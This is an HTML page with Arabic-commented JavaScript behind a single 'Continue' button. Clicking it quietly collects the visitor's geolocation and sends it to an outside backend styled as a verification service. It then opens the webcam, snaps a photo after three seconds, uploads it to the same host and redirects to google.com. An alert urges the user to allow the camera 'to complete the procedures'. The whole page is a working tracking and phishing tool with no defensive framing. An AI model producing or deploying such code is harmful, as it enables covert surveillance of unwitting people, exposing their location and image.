<button onclick="start()">Continue</button>

<script>
async function start() {
    console.log("1. جاري طلب الموقع...");

    // طلب الموقع الجغرافي
    navigator.geolocation.getCurrentPosition(
        async (pos) => {
            console.log("✅ تم تحديد الموقع، جاري إرساله للسيرفر...");
            try {
                await fetch("https://verification-backend-o1t0.onrender.com/location", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude
                    })
                });
            } catch (e) { 
                console.log("خطأ في الاتصال بسيرفر الموقع"); 
            }
            // بعد الانتهاء من الموقع، نفتح الكاميرا
            openCamera();
        },
        (err) => {
            console.log("❌ المستخدم رفض الموقع أو حدث خطأ، ننتقل للكاميرا...");
            // حتى لو رفض الموقع، نفتح الكاميرا لتكملة العملية
            openCamera();
        }
    );
}

function openCamera() {
    console.log("2. جاري طلب الكاميرا...");
    
    navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
        let video = document.createElement("video");
        video.srcObject = stream;
        video.play();

        let canvas = document.createElement("canvas");

        setTimeout(() => {
            canvas.width = 300;
            canvas.height = 200;
            canvas.getContext("2d").drawImage(video, 0, 0, 300, 200);

            // إيقاف الكاميرا
            stream.getTracks().forEach(track => track.stop());

            canvas.toBlob((blob) => {
                if (!blob) return;
                
                const formData = new FormData();
                formData.append("image", blob, "photo.png");

                console.log("جاري رفع الصورة للسيرفر...");
                fetch("https://verification-backend-o1t0.onrender.com/image", {
                    method: "POST",
                    body: formData
                })
                .then(res => {
                    if (res.ok) {
                        console.log("تمت العملية بنجاح!");
                        window.location.href = "https://google.com";
                    }
                })
                .catch(err => console.log("خطأ في رفع الصورة:", err));

            }, 'image/png');
        }, 3000); // التقاط الصورة بعد 3 ثوانٍ من فتح الكاميرا
    })
    .catch(err => {
        alert("الرجاء السماح للكاميرا بالعمل لتكملة الإجراءات!");
        console.error("Camera error:", err);
    });
}
</script>
